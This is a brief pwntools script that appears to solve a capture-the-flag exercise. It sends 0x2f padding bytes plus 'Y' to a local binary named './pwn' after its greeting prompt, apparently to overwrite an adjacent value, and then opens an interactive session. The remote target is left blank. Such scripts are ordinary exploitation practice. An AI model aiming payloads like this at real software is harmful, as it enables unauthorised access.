#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch='amd64', endian='el', os='linux')
context.log_level = 'debug'
if debug == 1:
    p = process(['./pwn'])
else:
    p = remote('', )

pd = 'a' * 0x2f
pd += 'Y'
p.sendlineafter('H31lo JuNe~\n', pd)
p.interactive()

